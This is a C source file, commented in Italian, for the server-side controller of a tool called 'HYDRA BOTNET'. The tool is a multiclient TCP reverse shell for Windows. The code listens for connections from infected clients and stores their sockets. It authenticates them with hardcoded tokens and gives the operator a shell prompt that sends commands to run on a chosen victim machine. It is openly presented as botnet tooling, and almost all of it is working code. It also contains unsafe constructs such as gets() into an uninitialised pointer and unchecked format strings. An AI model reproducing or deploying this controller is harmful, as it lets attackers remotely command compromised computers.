/*
	*	*	*	*	*	*	*	*	*	*	*	*	*
	*	*	*	*	*	*	*	*	*	*	*	*	*
	*   H   Y   D   R   A   B   O   T   N   E   T   *
	*   * Multiclient TCP Reverse shell 1.0.3.1 *   *
	*	*	*	*	*	*	*	*	*	*	*	*	*
	*   Scritto in C & test eseguiti Dev-C 5.11 *   *
	*   *  sviluppatore: Malcolm Mami Gen.2024  *   *
	*   *   *   *   *   *   *   *   *   *   *   *   *
	*	*	*	*	*	*	*	*	*	*	*	*	*
	*   *   *   *  < Server-side >	*	*	*	*	*
*/

#include <stdio.h>
#include <winsock2.h>
#include <stdbool.h>
#include <setjmp.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h> // Interruzione tastiera

// Numero di connessioni che riesco a gestire e lunghezza array
#define LISTSOCKSIZE 128

// Dimensione massima della stringa che memorizza l'ip del client conn.in arrivo
#define STR_MAX_SIZE 255

// Tokens di connessione
#define AUTH_RQST    "S7b9cV3mA4jLz7qd"
#define AUTH_MSG     "D4mX0LpNaV1o3FqC"
#define END_AUTH_MSG "Ld5c6q2NbUw1m9zA"
#define END_MSG      "V1bK8Nx5jL3OqfTw"
#define END_CONNECT  "3NdEDC0nN3Ct10nS"

// CharSplitter
#define SPLITTER "00001111"

// Libreria Winsock2
#pragma comment(lib,"ws2_32.lib")

// Contatore stringa dei client in arrivo
char *strings[STR_MAX_SIZE];
// Numero del client da associare alla stringa del nome del client
int count;
// contatore stringa descrittore socket
int z;
// Variabili globali:
// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
// Inizializzo libreria socket
WSADATA wsa;
// Inizializzo i sockets di rete
SOCKET s;
SOCKET new_socket;
// Loop di gestione della SCANSIONE delle connessioni dei CLIENT in ARRIVO
// (default = attivo)
bool searching = true;
// Loop principale di comunicazione con il singolo client
bool isActive = false;
//  * Memorizzazione e gestione delle connessioni in arrivo tramite arrays *
//  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *
// Contatore dei socket disponibili
int item;
// Inizializzazione array INT mem. socket ACCEPT
int acceptSocketList[LISTSOCKSIZE];
//  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *
//  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *

// FUNZIONE CONTROLLO STRINGHE IN ARRIVO   *   *   *   *   *
// *   *   *   *   *   *   *   *   *   *   *   *   *   *   *
// *   *   *   *   *   *   *   *   *   *   *   *   *   *   *
bool startsWith (char* base, char* str);
bool endsWith (char* base, char* str);

bool startsWith (char* base, char* str)
{
    return (strstr(base, str) - base) == 0;
}

bool endsWith (char* base, char* str)
{
    int blen = strlen(base);
    int slen = strlen(str);
    return (blen >= slen) && (0 == strcmp(base + blen - slen, str));
}

int main()
{	
	// CARICA IL MANIFESTO *   *   *   *   *   *   *   *   *   *
	// *   *   *   *   *   *   *   *   *   *   *   *   *   *   *
	// *   *   *   *   *   *   *   *   *   *   *   *   *   *   *
	void loadManifest()
	{
		printf("\tH Y D R A B O T N E T\n\t* Server: Rel.1.0.3.1 - 02/08/2023\n\t* Autore: Malcolm Mami (SuperMalc)\n");
	}	
	
	char send_command(char *auth_msg, SOCKET new_socket)
	{		
		// Inserisco input utente
		char *input;
		printf("\nShell>");
		gets(input);
	
		// Comando di uscita / disconnessione dal client
		int exit_result;
		char str_exit[] = "disconnect";
		// Comparazione stringa
		exit_result = strcmp(str_exit, input);
		
		// Disconnessione dal client
		if (exit_result == 0)
		{
			printf(" > Disconnessione dal client");
			
			isActive = false;
			searching = true;
			
			system("cls");
			loadManifest();
			printf("\n * RIAVVIO DEL SERVER...\n   < attendi l'arrivo di nuove connessioni >");
			
			// Svuota entrambi i contatori dei due arrays che memorizzano le conn. in ingresso
			item = 0;
			count = 0;
			
			// Inizializzazione array CHAR di memorizzazione del socket descriptor
			//char *arraySocks[LISTSOCKSIZE];
			// Re-inizializzazione array INT mem. socket ACCEPT
			int acceptSocketList[LISTSOCKSIZE];
			// avvisa il client della disconnessione (END_CONNECT)
			send(new_socket, END_CONNECT, strlen(END_CONNECT), 0);
			// Effettiva disconnessione dal client (chiusura del socket)
			closesocket(new_socket);
			// Arresto processi invio e ricezione dati sul socket
			shutdown(new_socket, 2);
			
			// * * * * * Qui si chiude il programma * * * * * 
			WSACleanup();
			return 1;
		}
		else
		{
			// invio il comando remoto al client con all'inizio una stringa di controllo
			// Concateno le stringhe per formare il messaggio finale da inviare			
			char comando_remoto[512];
			strcpy(comando_remoto, auth_msg);
			strcat(comando_remoto, input);
			// invio del messaggio
			send(new_socket, comando_remoto, strlen(comando_remoto), 0);		
		}
	}
	
	void sigint_handler(int signum)
	{
		//Handler per SIGINT
		//Resetta handler per prendere il comando SIGINT di nuovo
		signal(SIGINT, sigint_handler);
		
		system("cls");
		loadManifest();
		
		printf("\n * CLIENT DISPONIBILI :\n");
		
		if (item != 0)
		{
			for (z = 0; z < count; z++) {
					
				if (strings[z] != NULL) {
					printf("\n Client id (%d) ~ %s", z,strings[z]);					
					//free(strings[z]);
				}
			}
	
			int select;
			//scanf("%d", &select);	--> Non funziona correttamente :(
			char number[16];
			printf("\n\n * SELEZIONA CLIENT ID: ");
			gets(number);
			select = atoi(number);
			
			// controllo se il numero inserito è valido (se presente nell'array)		
			if (select <= (item - 1))
			{
				// Client valido
				printf(" > Connessione in corso al client selezionato:(%d) attendere...", select);
							
				// Vado a pescare il client memorizzato nell'array dei socket
				new_socket = acceptSocketList[select];
				
				// Verifico che il socket sia valido
				if (new_socket == SOCKET_ERROR)
				{
					printf("\n > (Errore socket): codice %d", WSAGetLastError());
					closesocket(new_socket);
					WSACleanup();	
				}
				else
				{
					// Socket valido
					// Inizio la comunicazione con il client selezionato
					// Invio un handshake al client (MESSAGGIO DI AUTENTICAZIONE) per "svegliarlo"
					char *wakeUpMsg = AUTH_RQST;
					send(new_socket, wakeUpMsg, strlen(wakeUpMsg) , 0);
									
					int recv_size;
					char client_reply[512];
					
					// Mi metto in ricezione e attendo una risposta dal parte del client [ACK]
					if((recv_size = recv(new_socket, client_reply, 512, 0)) == SOCKET_ERROR)
					{
						printf("\n > (Errore socket): ricezione dati fallita");
						closesocket(new_socket);
						WSACleanup();						
					}
					else
					{
						// Significa che ho ricevuto qualcosa dal client
						// Add a NULL terminating character to make it a proper string before printing
						client_reply[recv_size] = '\0';
											
						// Ora controllo se il messaggio di autenticazione ricevuto dal client è corretto
						if (startsWith(client_reply, AUTH_MSG))
						{
							// Applico un puntatore alla variabile messaggio ricevuto
							char *msg_display = client_reply;						
							
							// Rimuovo i primi 16 caratteri di autenticazione (non ci interessano più) per ottenere il percorso di lavoro
							msg_display += 16;
							char *working_path;
							working_path = strstr(msg_display, SPLITTER);
							working_path += 8;
							// Ottengo lunghezza della stringa percorso di lavoro per poi ottenere il nome del client						
							int length;
							length = strlen(working_path); 
							msg_display[strlen(msg_display)-(length+8)] = '\0';
							
							// Dichiaro che la connessione è stata stabilita con successo
							printf("\n > Connessione stabilita con: %s", msg_display);
							// Informo sul percorso di lavoro del client nella shell
							printf("\n > Percorso: %s", working_path);						
													
							// Devo avvisare il client che l'autenticazione si è CONCLUSA [END_AUTH_MSG]
							send(new_socket, END_AUTH_MSG, strlen(END_AUTH_MSG), 0);
							
							// Avvio del loop di comunicazione con il client
							isActive = true;						
							
							// *   *   *   *   *   *
							// Loop di comunicazione
							while(isActive)
							{
								// Attendo una risposta al client
								if ((recv_size = recv(new_socket, client_reply, 512, 0)) == SOCKET_ERROR)
								{
									// Errore ricezione
									printf("\n > (Errore socket) connessione interrotta %d", WSAGetLastError());
																	
									// Reinizializzo array socket
									item = 0;
									char *arraySocks[LISTSOCKSIZE];
									int acceptSocketList[LISTSOCKSIZE];
									
									closesocket(new_socket);
									WSACleanup();
									
									isActive = false;					
									searching = true;
									
								}
								else
								{
									// Ricezione riuscita
									client_reply[recv_size] = '\0';
									
									// Verifica lunghezza dati messaggio
									if (endsWith(client_reply, END_MSG))
									{								
										char new_string[512];
										memcpy(new_string, client_reply, strlen(client_reply) - 16);
										new_string[strlen(client_reply) - 16] = '\0';
										//Ultima stringa di risultato ad essere stampata
										printf(new_string);						
										//Invio il comando remoto al client - send command
										// NECESSARIO CHE SIA QUI ALTRIMENTI NON CONTROLLA LA FINE DEI DATI
										// *  *	 *	*  *  *  *  *  *  *  *  *  *
										send_command(AUTH_MSG, new_socket);
									}
									else
									{
										printf(client_reply);
										
									}
								}
							} // *   *   *   *   *   FINE LOOP DI COMUNICAZIONE   *   *						
						}
					}
				}			
			}
			else
			{	// ID Client inserito non valido
				printf("\n * ID CLIENT NON VALIDO\n   [Ctrl + c] per reinserire\n");
			}
		}
		else
		{
			printf("\n < Nessun client disponibile per la connessione >");
		}
	}
	
	
	// Carico il manifesto dello script	
	loadManifest();
	
	// Configura le strutture server e client di "sockaddr_in" per la comunicazione
	struct sockaddr_in server;
	struct sockaddr_in client;
	
	// Dichiarazione variabile stringa di invio
	char *message;
	// Dimensione in byte del buffer di ricezione dati dal client
	char client_reply[512];
	
	int recv_size;
	
	// Assegnazione della porta di comunicazione
	int port = 8888;
	
	// Inizializzazione modulo winsock2
	printf("\n # Server in fase di avvio:\n");
	printf("\n > Controllo su avvio modulo ws2 -->");
	
	int status = WSAStartup(MAKEWORD(2, 2), &wsa);
	// Controllo avvio modulo winsock2
	// ws2_32.lib è il file della libreria || ws2_32.dll è il file DLL	
	if (status != 0)	
	{
		printf("Fallito. Codice errore: %ld", status);
		WSACleanup();
		return 1;
	}
	else
	{
		printf("OK");
	}
	
	printf("\n > Generazione socket di ascolto -->");
	
	// Creazione del socket...
	// Assegnazione tipologia di socket di rete su cui ascoltare le richieste delle connessioni in arrivo
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	
	// Verifica che il socket sia valido
	if(s == INVALID_SOCKET)
	{
		printf(" > Errore di inizializzazione del socket: %ld" , WSAGetLastError());
		WSACleanup();
		return 1;
	}
	else
	{
		printf("OK");		
	}
	
	// Configura la struttura di: sockaddr_in [server]
	// The sockaddr_in structure specifies the address family,
    // IP address, and port for the socket that is being bound.
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = htonl(INADDR_ANY);
	server.sin_port = htons(port);
	//inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);

	// Binding del socket: unione indirizzo e porta al socket
	printf("\n > Controllo binding su indirizzo e porta -->");
	
	// Binding tra indirizzo e porta del socket
	if (bind(s, (SOCKADDR *) & server, sizeof(server)) == SOCKET_ERROR)
	{
		printf("\n ! Bind Fallito. Codice di errore: %d" , WSAGetLastError());
		closesocket(s);
		WSACleanup();
		return 1;
	}
	else
	{
		printf("OK");
	}
	
	//Avvio del server completato
	printf("\n > Inizializzazione ascolto -->");
	// Metto in ascolto il socket sulle nuove connessioni in arrivo (128 connessioni max. consentite)	
	if (listen(s, 1) == SOCKET_ERROR)
	{
		printf("\n ! Ascolto fallito, codice errore: %ld", WSAGetLastError());
		closesocket(s);
		WSACleanup();
        return 1;
	}
	else
	{
		printf("OK");
	}		
	
	/*
	
	// Socket options:
	BOOL bOptVal = TRUE;
	int bOptLen = sizeof(BOOL);
	int iOptVal;
	int iOptLen = sizeof(int);
	
	Timeout:
	struct timeval tv;
	tv.tv_sec = 5000;   
	
	if (getsockopt(s, SOL_SOCKET, SO_KEEPALIVE, (char*)&iOptVal, &iOptLen) != SOCKET_ERROR) 
	{
    	printf("\n > [Socket config]: SO_KEEPALIVE valore: %ld.", iOptVal);    	
	}
	
	if (setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, (char*)&bOptVal, bOptLen) != SOCKET_ERROR)
	{
    	printf("\n > [Socket config]: Configurazione invio keep-alives in corso...");
	}
	
	if (getsockopt(s, SOL_SOCKET, SO_KEEPALIVE, (char*)&iOptVal, &iOptLen) != SOCKET_ERROR)
	{
    	printf("\n > (Completata): SO_KEEPALIVE attivata valore: %ld.", iOptVal);
  	}
  	
	if (setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (struct timeval *)&tv,sizeof(struct timeval) != SOCKET_ERROR))
	{
    	printf("\n > [Timeout]: ...%d", tv);
	}
	
	if (getsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (struct timeval *)&tv,sizeof(struct timeval) != SOCKET_ERROR))
	{
    	printf("\n > [Timeout]: ...%d", tv);
	}
	
	*/  	
	
	// *  *	 *	*  *  *  *	*  *  *  *  *  *  *
	printf("\n\n # Server avviato: in attesa di connessioni in arrivo, porta: %d", port);
	
	// Loop di ascolto (gestione MULTICLIENT)
	while(searching)
	{
		// Richiama funz. keyboardInterrupt [ctrl+c]
		signal(SIGINT, sigint_handler);
		
		// Creo un nuovo SOCKET per accettare le richeste in arrivo (funzione di accept)
		// new_socket = accept(s, (struct sockaddr *)&client, &recv_size);   ---  questo non funziona con win11
		new_socket = accept(s, NULL, NULL);
		
		// Controllo funzione "accept" RIUSCITA o FALLITA
		if (new_socket == INVALID_SOCKET)
		{
			printf("\n > Errore di inizializzazione del socket: %ld", WSAGetLastError());
			// Chiusura del socket
			closesocket(new_socket);
			WSACleanup();
			return 1;
		}
		else	// Accept riuscito!
		{
			// Prelevo info. dalla connessione in arrivo
			char *client_ip = inet_ntoa(client.sin_addr);
			// Avviso a video della connessione in arrivo
			printf("\n > (+) Nuova connessione in ingresso da %s", client_ip);
			
			// Formatto la stringa per inserirla nell'array
			char *ret;
			ret = (char *) malloc(sizeof(char) * 255);
			strcpy(ret, client_ip);
			
			// Aggiungo la nuova stringa all'array che memorizza gli indirizzi dei clients
			strings[count] = ret;
			count++;			
		
			// Memorizzo il socket nell'array per una futura connessione ad esso
			acceptSocketList[item] = new_socket;
			item++;		
		}
	}
}
